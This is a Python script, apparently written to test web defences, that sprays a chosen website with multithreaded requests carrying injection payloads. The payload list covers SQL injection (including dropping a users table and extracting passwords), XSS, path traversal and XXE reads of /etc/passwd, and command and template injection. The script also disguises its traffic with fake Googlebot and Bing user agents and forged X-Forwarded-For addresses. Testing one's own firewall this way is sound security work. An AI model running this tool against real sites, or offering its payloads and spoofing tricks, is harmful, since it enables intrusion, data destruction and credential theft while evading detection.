#!/usr/bin/env python3
import argparse
import os
import random
import requests
import string
import time
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import quote

# -------------------------
# CONFIGURATION
# -------------------------
TARGET_URL = "https://yourtargetdomain.com"
THREADS = 10
REQUESTS_PER_THREAD = 100
DELAY_BETWEEN_REQUESTS = 0.5  # seconds
VERIFY_TLS = True
LOG_FILE = None

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Googlebot/2.1 (+http://www.google.com/bot.html)",
    "Bingbot/2.0 (+http://www.bing.com/bingbot.htm)",
    "curl/7.68.0",
    "python-requests/2.27.1",
    "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
]

# -------------------------
# ADVANCED PAYLOADS
# -------------------------
PAYLOADS = [
    # SQL Injection
    "' OR '1'='1 --",
    "1; DROP TABLE users --",
    "' UNION SELECT null, username, password FROM users --",
    "' OR 'a'='a' /*",
    # Encoded SQLi
    quote("' OR '1'='1"),  # URL encoded
    # XSS
    "<script>alert('xss')</script>",
    "<img src=x onerror=alert(1)>",
    "<svg/onload=alert`XSS`>",
    "%3Cscript%3Ealert('encoded')%3C/script%3E",  # Encoded XSS
    # LFI / Path Traversal
    "../../../../etc/passwd",
    "..%2F..%2F..%2F..%2Fetc%2Fpasswd",  # URL encoded
    # Command Injection
    "; cat /etc/passwd",
    "| ls -la /",
    "|| ping -c 1 127.0.0.1",
    # RCE
    "`whoami`",
    "$(id)",
    "${7*7}",
    # XXE
    "<?xml version='1.0'?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>"
]

# -------------------------
# HELPER FUNCTIONS
# -------------------------
def random_string(length=8):
    return ''.join(random.choice(string.ascii_letters) for _ in range(length))

def build_url():
    path = "/" + random_string(random.randint(5, 15))
    params = {
        random_string(4): random.choice(PAYLOADS) if random.random() < 0.5 else random_string(6)
        for _ in range(random.randint(1, 4))
    }
    query = "&".join([f"{k}={v}" for k, v in params.items()])
    return f"{TARGET_URL}{path}?{query}"

def send_request():
    url = build_url()
    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"
    }
    try:
        r = requests.get(url, headers=headers, timeout=5, verify=VERIFY_TLS)
        line = f"[{r.status_code}] {url} ({headers['User-Agent']})"
    except requests.RequestException as e:
        line = f"[ERROR] {e}"
    print(line)
    if LOG_FILE:
        LOG_FILE.write(line + "\n")
        LOG_FILE.flush()

def worker():
    for _ in range(REQUESTS_PER_THREAD):
        send_request()
        time.sleep(DELAY_BETWEEN_REQUESTS)

# -------------------------
# MAIN
# -------------------------
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Bot & Injection traffic generator")
    parser.add_argument("--target", default=TARGET_URL)
    parser.add_argument("--threads", type=int, default=THREADS)
    parser.add_argument("--rpt", type=int, default=REQUESTS_PER_THREAD, help="Requests per thread")
    parser.add_argument("--delay", type=float, default=DELAY_BETWEEN_REQUESTS, help="Delay between requests")
    parser.add_argument("--logdir", default=None, help="Directory to write bot_test.log")
    parser.add_argument("--insecure-tls", action="store_true", help="Disable TLS verification")
    args = parser.parse_args()

    TARGET_URL = args.target
    THREADS = args.threads
    REQUESTS_PER_THREAD = args.rpt
    DELAY_BETWEEN_REQUESTS = args.delay
    VERIFY_TLS = not args.insecure_tls

    if args.logdir:
        os.makedirs(args.logdir, exist_ok=True)
        LOG_FILE = open(os.path.join(args.logdir, "bot_test.log"), "a")

    try:
        with ThreadPoolExecutor(max_workers=THREADS) as executor:
            for _ in range(THREADS):
                executor.submit(worker)
    finally:
        if LOG_FILE:
            LOG_FILE.close()
